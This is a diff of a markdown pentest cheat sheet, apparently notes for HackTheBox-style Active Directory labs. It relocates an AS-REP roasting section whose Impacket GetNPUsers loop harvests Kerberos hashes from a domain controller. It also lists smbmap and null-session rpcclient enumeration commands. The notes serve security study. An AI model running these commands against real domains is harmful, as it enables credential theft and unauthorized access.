@@ -4,14 +4,6 @@
 ### Get Domain name
 - `smbmap -H $IP`
 
-### AS-REP roasting
-AS-REP roasting is only applicable when set `Accounts Does not Require Pre-Authentication`
-
- EXPLOITING:
-- `GetNPUsers.py $DOMAIN.local/ -dc-ip $IP -usersfile users.txt`
-
-
-
 ### rpcclient
 - `rpcclient -U "" -N $DOMAIN` Connect to rpcclient
 - `enumdomusers` Enumerate Domain Users
@@ -22,6 +14,13 @@ AS-REP roasting is only applicable when set `Accounts Does not Require Pre-Authe
 
 <!-- -->
 [Enumerating AD with rpcclient](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/)
+
+### AS-REP roasting
+AS-REP roasting is only applicable when set `Accounts Does not Require Pre-Authentication`
+
+ EXPLOITING:
+- put all user's in a file names `users.txt`
+- `for user in $(cat users.txt); do GetNPUsers.py -no-pass -dc-ip $IP htb/${user} | grep -v Impacket; done` GetNPUsers is in impacket
 
 ### BloodHound
 starting BloodHound
